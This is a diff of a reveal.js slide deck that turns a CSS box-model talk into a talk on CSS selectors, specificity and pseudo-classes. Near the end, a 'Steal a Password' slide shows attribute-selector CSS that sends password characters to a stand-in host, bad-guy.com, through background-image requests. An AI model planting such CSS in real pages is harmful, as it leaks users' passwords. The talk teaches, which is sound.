@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-    <title>The Box Model | Little Known CSS Basics</title>
+    <title>Selectors | Little Known CSS Basics</title>
 
     <link rel="stylesheet" href="css/reveal.css">
     <link rel="stylesheet" href="css/theme/custom.css">
@@ -28,466 +28,347 @@
     <div class="reveal">
       <div class="slides">
         <section>
-          <h1>Little Known <br />CSS Basics <em>The Box Model</em></h1>
+          <h1>Little Known <br />CSS Basics <em>Selectors</em></h1>
+        </section>
+
+        <section data-background="/images/bubblewrap.jpg">
+          <h1><em>Selectors</em> The Bubble Wrap You Need to Ship CSS Safely</h1>
         </section>
 
         <section>
           <section>
-            <h2>Everything Is A Rectangle</h2>
+            <h2>What Are CSS Selectors?</h2>
           </section>
 
           <section>
-            <h3>All rectangles have:</h3>
-            <ul>
-              <li class="fragment"><code>height</code></li>
-              <li class="fragment"><code>width</code></li>
-            </ul>
+            <h3>Universal</h3>
+            <pre class="fragment" data-trim data-noescape><code class="css">* {
+  /*
+   * selects any element
+   */
+}</code></pre>
           </section>
 
           <section>
-            <h3>Height defaults to <em class="fragment">content height</em></h3>
+            <h3>Tag</h3>
+            <pre class="fragment" data-trim data-noescape><code class="css">p {
+  /*
+   * selects all paragraph tags
+   */
+}</code></pre>
+            <pre class="fragment" data-trim data-noescape><code class="css">a {
+  /*
+   * selects all anchor tags
+   */
+}</code></pre>
           </section>
 
           <section>
-            <h3>Width defaults to <em class="fragment">block formatting default</em></h3>
-            <ul>
-              <li class="fragment"><code>block</code> &mdash; <code>100%</code></li>
-              <li class="fragment"><code>inline</code> / <code>inline-block</code> &mdash; content width</li>
-            </ul>
+            <h3>Class</h3>
+            <pre class="fragment" data-trim data-noescape><code class="css">.menu {
+  /*
+   * selects any element with the class `menu`
+   */
+}</code></pre>
           </section>
 
           <section>
-            <h3>Override width and height with:</h3>
-            <ul>
-              <li class="fragment">explicit <code>width</code> &amp; <code>height</code> properties</li>
-              <li class="fragment">also <code>min-</code> and <code>max-</code> versions</li>
-            </ul>
+            <h3>ID</h3>
+            <pre class="fragment" data-trim data-noescape><code class="css">#footer {
+  /*
+   * selects the element with the id `footer`
+   */
+}</code></pre>
           </section>
 
           <section>
-            <style contenteditable data-trim data-noescape>#box-1 {}</style>
-            <div class="output">
-              <div id="box-1" contenteditable>I'm a box.</div>
-            </div>
+            <h3>Attribute</h3>
+            <pre class="fragment" data-trim data-noescape><code class="css">[type="email"] {
+  /*
+   * selects any element with the
+   * `type` attribute `email`
+   */
+}</code></pre>
+            <pre class="fragment" data-trim data-noescape><code class="css">[alt] {
+  /*
+   * selects any element with an
+   * `alt` attribute
+   */
+}</code></pre>
+          </section>
+
+          <section>
+            <h3>Pseudo-elements</h3>
+            <pre class="fragment" data-trim data-noescape><code class="css">.clearfix::after {
+  /*
+   * selects the pseudo-element at the end
+   * of `.clearfix`
+   */
+}</code></pre>
+            <pre class="fragment" data-trim data-noescape><code class="css">::placeholder {
+  /*
+   * selects the placeholder in an input
+   */
+}</code></pre>
+          </section>
+
+          <section>
+            <h3>Pseudo-classes</h3>
+            <pre class="fragment" data-trim data-noescape><code class="css">input:focus {
+  /*
+   * selects inputs when they have focus
+   */
+}</code></pre>
+            <pre class="fragment" data-trim data-noescape><code class="css">a:hover {
+  /*
+   * selects anchors when they're hovered
+   */
+}</code></pre>
           </section>
         </section>
 
         <section>
           <section>
-            <h2>What Controls <br />&ldquo;Default&rdquo; Width &amp; Height?</h2>
+            <h2>Why Do Some Selectors Override Others?</h2>
           </section>
 
           <section>
-            <h3>CSS!</h3>
+            <h3>Specificity!</h3>
+          </section>
+
+          <section>
+            <h3>Specificity: TL;DR</h3>
             <ul>
-              <li class="fragment"><code>margin</code></li>
-              <li class="fragment"><code>border</code></li>
-              <li class="fragment"><code>padding</code></li>
-              <li class="fragment">contents</li>
+              <li class="fragment"><code>*</code></li>
+              <li class="fragment">HTML tags, pseudo-elements</li>
+              <li class="fragment"><code>.class</code>, <code>[attribute]</code>, pseudo-classes</li>
+              <li class="fragment"><code>#id</code></li>
             </ul>
           </section>
 
           <section>
-            <h3><code>margin</code></h3>
-            <p class="fragment"><code>margin</code> pushes elements away from other elements</p>
-            <p class="fragment">Neighboring <code>margin</code>s collapse.</p>
-            <p class="fragment">E.g., <code>margin-bottom: 10px</code> followed by <code>margin-top: 20px</code> creates a <code>20px</code> gap.</p>
+            <h3>But also&hellip;</h3>
+            <p class="fragment"><code>.compound.selectors</code></p>
+            <p class="fragment"><code>.complex .selectors</code></p>
           </section>
 
           <section>
-            <style contenteditable data-trim data-noescape>#box-margin-1 {
-  margin: 0 0 40px;
-}
-#box-margin-2 {
-  margin: 40px 60px 0;
-}</style>
-            <div class="output">
-              <div id="box-margin-1">I have no left / right <code>margin</code>.</div>
-              <div id="box-margin-2"><code>margin</code> is pushing me in from my parent&apos;s edges.</div>
-            </div>
+            <h3>Calculating Specificity</h3>
+            <table>
+              <thead>
+                <tr>
+                  <th>Inline</th>
+                  <th>ID</th>
+                  <th>Class <br />Attribute <br />Ps-Class</th>
+                  <th>Tag <br />Ps-Element</th>
+                </tr>
+                <tbody>
+                  <tr>
+                    <td>1</td>
+                    <td>1</td>
+                    <td>1</td>
+                    <td>1</td>
+                  </tr>
+                </tbody>
+              </thead>
+            </table>
           </section>
 
           <section>
-            <h3><code>padding</code></h3>
-            <p class="fragment"><code>padding</code> pushes an element&apos;s contents away from its edges</p>
-            <p class="fragment"><em>Note:</em> there&apos;s a caveat with <code>padding</code> coming later&hellip;</p>
+            <h3>Calculating Specificity</h3>
+            <ul>
+              <li class="fragment"><code>*</code>: <code>0,0,0,0</code></li>
+              <li class="fragment">Tag: <code>0,0,0,1</code></li>
+              <li class="fragment">Class: <code>0,0,1,0</code></li>
+              <li class="fragment">ID: <code>0,1,0,0</code></li>
+              <li class="fragment">Inline: <code>1,0,0,0</code></li>
+            </ul>
           </section>
 
           <section>
-            <style>
-              #box-padding-1,
-              #box-padding-2 {
-                position: relative;
-              }
-              #box-padding-1::before,
-              #box-padding-2::before {
-                position: absolute;
-                top: 10px; right: 0; bottom: 10px; left: 0;
-                content: '';
-                background-color: rgba(0,0,0,.15);
-              }
-              #box-padding-2::before {
-                right: 40px;
-                left: 40px;
-              }
-            </style>
-            <style contenteditable data-trim data-noescape>#box-padding-1 {
-  padding: 10px 0;
-  margin-bottom: 10px;
-}
-#box-padding-2 {
-  padding: 10px 40px;
-}</style>
-            <div class="output">
-              <div id="box-padding-1">I have no left / right <code>padding</code>.</div>
-              <div id="box-padding-2"><code>padding</code> is pushing my contents away from my edges.</div>
-            </div>
-          </section>
-
-          <section>
-            <h3><code>border</code></h3>
-            <p class="fragment"><code>border</code> adds to an element&apos;s height and width (like <code>margin</code>); it doesn&apos;t force its contents in (like <code>padding</code>).</p>
-          </section>
-
-          <section>
-            <style contenteditable data-trim data-noescape>#box-border-1 {
-  border: 10px solid rgba(255,255,255,.5);
-  width: 500px;
-}
-#box-border-2 {
-  border: 5px solid rgba(0,0,0,.5);
-  width: 500px;
-}</style>
-            <div class="output">
-              <div id="box-border-1">My <code>border</code> adds <code>20px</code> to my width &amp; height.</div>
-              <div id="box-border-2">My <code>border</code> adds <code>10px</code> to my width &amp; height.</div>
-            </div>
-          </section>
-
-          <section>
-            <style contenteditable data-trim data-noescape>#box-border-half {
-  display: inline-block;
-  width: 50%;
-  vertical-align: top;
-  border: 0px solid white;
-}</style>
-            <div class="output">
-              <div id="box-border-half">I&apos;m half my parent&apos;s width.</div><div id="box-border-half">I&apos;m half my parent&apos;s width, too.</div>
-            </div>
-          </section>
-
-          <section>
-            <style>
-              #box-model {
-                max-width: 100%;
-                text-align: center;
-              }
-              #box-model * {
-                position: relative;
-                display: block;
-              }
-              #box-model *::before {
-                content: attr(data-name);
-                position: absolute;
-                top: 5px;
-                left: 10px;
-                font-size: .8em;
-                z-index: 2;
-              }
-              #box-model__margin {
-                padding: 80px 40px;
-                outline: 2px dashed white;
-              }
-              #box-model__border {
-                border: 6px solid rgba(255,255,255,.5);
-              }
-              #box-model__border::before {
-                top: -.8em;
-                left: auto;
-                right: 10px;
-              }
-              #box-model__padding {
-                padding: 60px;
-                background-color: #5c6443;
-              }
-              #box-model__contents {
-                padding: 40px;
-                background-color: #60569c;
-              }
-            </style>
-            <h3>The Box Model</h3>
-            <p id="box-model">
-              <span id="box-model__margin" class="fragment" data-name="Margin">
-                <span id="box-model__border" class="fragment" data-name="Border">
-                  <span id="box-model__padding" class="fragment" data-name="Padding">
-                    <span id="box-model__contents" class="fragment">Element Contents</span>
-                  </span>
-                </span>
-              </span>
+            <h3>Blow It All Away</h3>
+            <p class="fragment">
+              <code>!important</code>
+              <p class="fragment">Only if you <i>really</i> know what you&apos;re doing&hellip;</p>
             </p>
           </section>
         </section>
 
         <section>
           <section>
-            <h2>What Controls <em class="fragment">which CSS Properties Control</em> &ldquo;Default&rdquo; Width &amp; Height?</h2>
+            <h2>How Can I Combine Selectors?</h2>
           </section>
 
           <section>
-            <h3><code>box-sizing</code></h3>
-            <p class="fragment"><code>content-box</code>: padding can affect element size <span class="fragment">(browser default, ugh)</span></p>
-            <p class="fragment"><code>border-box</code>: padding doesn't affect element size <span class="fragment">(every reset/normalize CSS)</span></p>
-          </section>
-
-          <section data-background="https://pbs.twimg.com/media/DU-T_p4VoAAztk5.jpg:large" data-background-size="contain"></section>
-          <section>
-            <style>[id*="box-sizing"] {
-  padding: 20px !important;
-  width: 500px !important;
-  height: 100px;
-}
-#box-sizing-1 {
-  box-sizing: content-box;
-  margin-bottom: 20px;
-}
-#box-sizing-2 {
-  box-sizing: border-box;
-}</style>
-            <pre data-trim data-noescape><code>.box {
-  padding: 20px;
-  height: 140px;
-  width: 500px;
-}</code></pre>
-            <div class="output">
-              <div id="box-sizing-1"><code>box-sizing: content-box</code> <br /><em>actually <code>540px</code> wide</em></div>
-              <div id="box-sizing-2"><code>box-sizing: border-box</code> <br /><em>actually <code>500px</code> wide</em></div>
-            </div>
+            <h3>Compound</h3>
+            <p class="fragment">Finds a single element that matches all conditions of the selector</p>
+            <p class="fragment"><code>a.link:hover</code></p>
+            <p class="fragment">Specificity: <code>0,0,2,1</code></p>
           </section>
 
           <section>
-            <h3><code>display</code></h3>
-            <p class="fragment">If an element is <code>inline</code>, its <code>padding</code> won&apos;t force it off the baseline, and it won&apos;t respond to vertical <code>margin</code>.</p>
-            <p class="fragment">If an element is <code>inline-block</code> (or <code>block</code>), its <code>padding</code> will affect its baseline, and it will respond to vertical <code>margin</code>.</p>
+            <h3>Descendant</h3>
+            <p class="fragment">Finds any matching element in the parent, no matter how deeply nested</p>
+            <p class="fragment"><code>.post-body ul</code></p>
+            <p class="fragment">Specificity: <code>0,0,1,1</code></p>
           </section>
 
           <section>
-            <style>
-              [id*="display-inline"] {
-                margin-bottom: 20px !important;
-                width: 500px;
-              }
-              #display-inline em {
-                padding: 10px;
-                margin: 10px 40px;
-                background-color: rgba(0,0,0,.5);
-              }
-              #display-inline-block em {
-                display: inline-block;
-                padding: 10px;
-                margin: 10px 40px;
-                background-color: rgba(0,0,0,.5);
-              }
-            </style>
-            <pre><code data-trim data-noescape>em {
-  padding: 10px;
-  margin: 10px 40px;
-  background-color: rgba(0,0,0,.5);
-}</code></pre>
-            <div class="output">
-              <div id="display-inline">Just a normal paragraph with an <em>inline element</em> in it.</div>
-              <div id="display-inline-block">Now a paragraph with an <em>inline-block element</em> in it.</div>
-            </div>
+            <h3>Child: <code>&gt;</code></h3>
+            <p class="fragment">Finds any matching element nested one level deep inside the parent</p>
+            <p class="fragment"><code>#mobile-nav > a</code></p>
+            <p class="fragment">Specificity: <code>0,1,0,1</code></p>
           </section>
 
           <section>
-            <h3><code>float</code></h3>
-            <p class="fragment"><code>float</code> makes an element&apos;s <code>width</code> exactly what its contents need, even if it&apos;s a <code>block</code> element.</p>
-            <p class="fragment">All other elements (that aren&apos;t explicitly cleared) flow around a <code>float</code>ed element.</p>
+            <h3>Adjacent Sibling: <code>+</code></h3>
+            <p class="fragment">Finds a matching sibling element immediately after the first element</p>
+            <p class="fragment"><code>.site-header + main</code></p>
+            <p class="fragment">Specificity: <code>0,0,1,1</code></p>
           </section>
 
           <section>
-            <style>
-              #box-floated {
-                background-color: rgba(0,0,0,.2);
-              }
-            </style>
-            <style contenteditable data-trim data-noescape>#box-floated {
-  float: left;
-  padding: 10px;
-}
-#box-normal {
-  clear: none;
-}</style>
-            <div class="output">
-              <div id="box-floated" contenteditable>I&apos;m floated</div>
-              <div id="box-normal" contenteditable>In the markup, I come after the floated box and I&apos;m allowed to flow just like normal in the document.</div>
-            </div>
-          </section>
-
-          <section>
-            <h3>Parent Element&apos;s CSS</h3>
-            <p class="fragment"><code>display: table</code></p>
-            <p class="fragment"><code>display: flex</code></p>
-            <p class="fragment"><code>display: grid</code></p>
-          </section>
-
-          <section>
-            <h4><code>display: table</code></h4>
-            <p class="fragment">Children behave like <code>display: table-row</code>&hellip;</p>
-            <p class="fragment">&hellip; unless they&apos;re set to be <code>display: table-cell</code>.</p>
-          </section>
-
-          <section>
-            <style>[id*="table"] {
-  display: table !important;
-  width: 100% !important;
-  margin-bottom: 20px !important;
-  box-shadow: 0 0 0 2px white;
-}
-[id*="table"] > div {
-  border: 1px solid black !important;
-}
-#table-1 > div {
-}
-#table-2 > div {
-  display: table-cell !important;
-}</style>
-            <div class="output">
-              <div id="table-1">
-                <div><code>display: block</code> (default)</div>
-                <div><code>display: block</code> (default)</div>
-              </div>
-              <div id="table-2">
-                <div><code>display: table-cell</code></div>
-                <div><code>display: table-cell</code></div>
-              </div>
-            </div>
-          </section>
-
-          <section>
-            <h4><code>display: flex</code></h4>
-            <p class="fragment">Children are sized according to flexbox rules applied to parent&hellip;</p>
-            <p class="fragment">&hellip; and flexbox rules applied to children.</p>
-          </section>
-
-          <section>
-            <style>[id*="flex"] {
-  display: flex !important;
-  width: 100% !important;
-  margin-bottom: 1em !important;
-  box-shadow: 0 0 0 2px white;
-}
-[id*="flex"] > div {
-  background-image: linear-gradient(90deg, #5c6443, #5c6443) !important;
-  background-size: cover;
-  margin: 2px !important;
-}
-#flex-2 :last-child {
-  align-self: flex-end;
-}</style>
-            <style contenteditable data-trim data-noescape>#flex-1 {
-  display: flex;
-}</style>
-            <div class="output">
-              <div id="flex-1">
-                <div><code>display:block</code></div>
-                <div><code>display:block</code></div>
-              </div>
-            </div>
-            <style contenteditable data-trim data-noescape>#flex-2 {
-  display: flex;
-  flex-direction: column;
-}</style>
-            <div class="output">
-              <div id="flex-2">
-                <div><code>display:block</code></div>
-                <div><code>display:block; align-self: flex-end</code></div>
-              </div>
-            </div>
-          </section>
-
-          <section>
-            <h4><code>display: grid</code></h4>
-            <p class="fragment">Children are sized according to grid rules applied to parent&hellip;</p>
-            <p class="fragment">&hellip; and grid rules applied to children.</p>
-            <p class="fragment"><em>That&apos;s another talk though&hellip;</em></p>
+            <h3>General Sibling: <code>~</code></h3>
+            <p class="fragment">Finds any matching sibling after the first element</p>
+            <p class="fragment"><code>h1 ~ p</code></p>
+            <p class="fragment">Specificity: <code>0,0,0,2</code></p>
           </section>
         </section>
 
         <section>
           <section>
-            <h2>Review</h2>
+            <h2>Can I Use a Selector to Get Specific ELements in a Group?</h2>
           </section>
 
           <section>
-            <h3>Element Size Controlled By:</h3>
+            <h3>For sure!</h3>
             <ul>
-              <li class="fragment"><code>margin</code></li>
-              <li class="fragment"><code>border</code></li>
-              <li class="fragment"><code>padding</code></li>
-              <li class="fragment">contents</li>
+              <li class="fragment"><code>:first-child</code></li>
+              <li class="fragment"><code>:nth-child(2)</code></li>
+              <li class="fragment"><code>:last-child</code></li>
+              <li class="fragment"><code>:nth-last-child(odd)</code></li>
             </ul>
           </section>
 
           <section>
-            <style>
-              #review-box-model {
-                max-width: 100%;
-                text-align: center;
-              }
-              #review-box-model * {
-                position: relative;
-                display: block;
-              }
-              #review-box-model *::before {
-                content: attr(data-name);
-                position: absolute;
-                top: 5px;
-                left: 10px;
-                font-size: .8em;
-                z-index: 2;
-              }
-              #review-box-model__margin {
-                padding: 80px 40px;
-                outline: 2px dashed white;
-              }
-              #review-box-model__border {
-                border: 6px solid rgba(255,255,255,.5);
-              }
-              #review-box-model__border::before {
-                top: -.8em;
-                left: auto;
-                right: 10px;
-              }
-              #review-box-model__padding {
-                padding: 60px;
-                background-color: #5c6443;
-              }
-              #review-box-model__contents {
-                padding: 40px;
-                background-color: #60569c;
-              }
-            </style>
-            <h3>The Box Model</h3>
-            <p id="review-box-model">
-              <span id="review-box-model__margin" class="fragment" data-name="Margin">
-                <span id="review-box-model__border" class="fragment" data-name="Border">
-                  <span id="review-box-model__padding" class="fragment" data-name="Padding">
-                    <span id="review-box-model__contents" class="fragment">Element Contents</span>
-                  </span>
-                </span>
-              </span>
-            </p>
+            <h3>For sure!</h3>
+            <ul>
+              <li class="fragment"><code>:first-of-type</code></li>
+              <li class="fragment"><code>:nth-of-type(4n)</code></li>
+              <li class="fragment"><code>:last-of-type</code></li>
+              <li class="fragment"><code>:nth-last-of-type(n-3)</code></li>
+            </ul>
           </section>
 
           <section>
-            <h3>Size Properties Affected By:</h3>
+            <h3>Use Cases</h3>
+            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/JpxOdb" rel="noreferrer noopener nofollow" target="_blank">Margins inside Padded Containers</a></p>
+            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/yvZPYm" rel="noreferrer noopener nofollow" target="_blank">Style Table Columns &amp; Rows</a></p>
+            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/EQrbNg" rel="noreferrer noopener nofollow" target="_blank">Style a Drop Cap in an Article's First Paragraph</a></p>
+          </section>
+        </section>
+
+        <section>
+          <section>
+            <h2>Are There Selectors for Styling Different Interactive States?</h2>
+          </section>
+
+          <section>
+            <h3>You betcha!</h3>
             <ul>
-              <li class="fragment"><code>box-sizing</code></li>
-              <li class="fragment"><code>display</code></li>
-              <li class="fragment"><code>float</code></li>
-              <li class="fragment">parent CSS</li>
+              <li class="fragment"><code>:hover</code></li>
+              <li class="fragment"><code>:active</code></li>
+              <li class="fragment"><code>:focus</code></li>
+              <li class="fragment"><code>:link</code></li>
+              <li class="fragment"><code>:visited</code></li>
             </ul>
+          </section>
+
+          <section>
+            <h3>You betcha!</h3>
+            <ul>
+              <li class="fragment"><code>:target</code></li>
+              <li class="fragment"><code>:checked</code></li>
+              <li class="fragment"><code>:disabled</code></li>
+              <li class="fragment"><code>:invalid</code></li>
+              <li class="fragment"><code>:valid</code></li>
+            </ul>
+          </section>
+
+          <section>
+            <h3>Use Cases</h3>
+            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/zRePPo" rel="noreferrer noopener nofollow" target="_blank">Custom Focus Style for Keyboard Nav</a></p>
+            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/BYMmOE" rel="noreferrer noopener nofollow" target="_blank">Highlight Targeted Element</a></p>
+            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/KQJZwM" rel="noreferrer noopener nofollow" target="_blank">HTML5 Form Validation</a></p>
+          </section>
+        </section>
+
+        <section>
+          <section>
+            <h2>Can I Use a <code>regex</code> selector to find things?</h2>
+          </section>
+
+          <section>
+            <h3>Kind of.</h3>
+            <ul>
+              <li class="fragment">Strict match: <code>[attr="string"]</code></li>
+              <li class="fragment">Begins with: <code>[attr^="string"]</code></li>
+              <li class="fragment">Ends with: <code>[attr$="string"]</code></li>
+              <li class="fragment">Contains anywhere: <code>[attr*="string"]</code></li>
+            </ul>
+          </section>
+
+          <section>
+            <h3>Kind of.</h3>
+            <ul>
+              <li class="fragment">Contains in a space-separated list: <code>[attr~="string"]</code></li>
+              <li class="fragment">Contains value or value followed by <code>-</code>: <code>[attr|="string"]</code></li>
+              <li class="fragment">Case insensitive match: <code>[attr*="String" i]</code></li>
+            </ul>
+          </section>
+
+          <section>
+            <h3>Use Cases</h3>
+            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/gvqoWY" rel="noreferrer noopener nofollow" target="_blank">Download Icons for File Types</a></p>
+            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/rJPpzp" rel="noreferrer noopener nofollow" target="_blank">Debug Inaccessible Images</a></p>
+            <p class="fragment"><a href="https://codepen.io/jdsteinbach/pen/PQVEQq" rel="noreferrer noopener nofollow" target="_blank">Style Internal/External Links Differently</a></p>
+          </section>
+        </section>
+
+        <section>
+          <section>
+            <h2><em>Ok, Impress Me!</em> How Complicated Can Selectors <i>Really</i> Get?</h2>
+          </section>
+
+          <section>
+            <h3>Find the Number of Elements in a Container</h3>
+            <pre data-trim data-escape><code class="css">.nav-item:first-child:nth-last-child(4) {
+  &,
+  & ~ * {
+    /*
+     * Styles for when there are
+     * 4 nav-items
+     */
+  }
+}</code></pre>
+            <p><a href="https://codepen.io/jdsteinbach/pen/wyNpQo" rel="noreferrer noopener nofollow" target="_blank">Codepen</a></p>
+          </section>
+
+          <section>
+            <h3>Steal a Password</h3>
+            <pre data-trim data-escape><code class="css">[type="password"][value$="a"] {
+  background-image:
+    url("https://bad-guy.com/password/a");
+}
+
+[type="password"][value$="b"] {
+  background-image:
+    url("https://bad-guy.com/password/b");
+}</code></pre>
+          </section>
+
+          <section>
+            <h3>Steal a Password</h3>
           </section>
         </section>
 
